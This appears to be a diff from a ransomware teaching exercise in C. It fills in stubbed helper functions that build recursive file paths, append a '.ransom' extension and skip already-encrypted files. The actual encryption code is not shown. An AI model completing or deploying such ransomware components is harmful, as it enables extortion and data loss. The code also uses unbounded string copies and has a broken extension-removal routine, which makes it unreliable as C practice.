@@ -45,12 +45,30 @@ int iter_recursively_through_files(char *path, char *password,
 
 void get_new_path_name(char *parentpath, char *finalpath, char *currentpath)
 {
-    // step 1
+    if (!parentpath || !finalpath || !currentpath)
+        return;
+
+    strcpy(finalpath, parentpath);
+
+    size_t len = strlen(finalpath);
+    if (len == 0 || finalpath[len - 1] != '/')
+        strcat(finalpath, "/");
+
+    strcat(finalpath, currentpath);
+
+    len = strlen(finalpath);
+    if (len == 0 || finalpath[len - 1] != '/')
+        strcat(finalpath, "/");
 }
 
 void add_file_extension(const char *filename, char *opt_filename)
 {
-    // step 1
+    if (!filename || !opt_filename)
+        return;
+
+    strcpy(opt_filename, filename);
+
+    strcat(opt_filename, ".ransom");
 }
 
 
@@ -58,9 +76,22 @@ void add_file_extension(const char *filename, char *opt_filename)
 ** As you can compare with the skip_already_decrypted for the decryption algorithm,
 ** you just have to skip the basics path and all the files with the encryptes extension.
 */
+bool skip_basics_path(const char *path)
+{
+    if (strcmp(path, ".")
+            && strcmp(path, ".."))
+        return false;
+    return true;
+}
+
 bool skip_already_encrypted(const char *path)
 {
-    // step 2
+    int len = strlen(path);
+
+    if (skip_basics_path(path) ||
+            !strcmp(&path[len - LEN_RANSOM_EXTENSION], ".ransom"))
+        return true;
+    return false;
 }
 
 void remove_file_extension(const char *filename, char *opt_filename)
@@ -71,14 +102,6 @@ void remove_file_extension(const char *filename, char *opt_filename)
         strncpy(opt_filename, filename, len - LEN_RANSOM_EXTENSION);
     strcpy(opt_filename, filename);
     strcat(opt_filename, ".decrypted");
-}
-
-bool skip_basics_path(const char *path)
-{
-    if (strcmp(path, ".")
-            && strcmp(path, ".."))
-        return false;
-    return true;
 }
 
 bool skip_already_decrypted(const char *path)
